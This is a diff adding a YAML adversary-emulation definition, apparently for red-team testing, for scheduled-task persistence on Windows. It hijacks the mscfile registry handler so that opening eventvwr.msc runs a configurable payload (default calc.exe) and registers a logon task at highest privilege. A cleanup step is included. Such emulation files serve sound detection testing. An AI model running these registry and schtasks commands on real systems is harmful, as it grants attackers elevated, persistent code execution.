@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Scheduled Task Persistence via Eventviewer.msc
+description: "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\nWhen the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). \n"
+args:
+    - name: task_name
+      type: string
+      default: EventViewerBypass
+    - name: payload
+      type: string
+      default: calc.exe
+uuid: 02124c37-767e-4b76-9383-c9fc366d9d4c
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1053: Scheduled Task/Job'
+    subtechniques:
+        - 'T1053.005: Scheduled Task'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: scheduled-task-persistence-via-eventviewer.msc
+      inline: |
+        reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\{{.Args.payload}}" /f
+        schtasks /Create /TN "{{.Args.task_name}}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
+        ECHO Let's run the schedule task ...
+        schtasks /Run /TN "EventViewerBypass"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
+            schtasks /Delete /TN "{{.Args.task_name}}" /F
+        executor: command_prompt
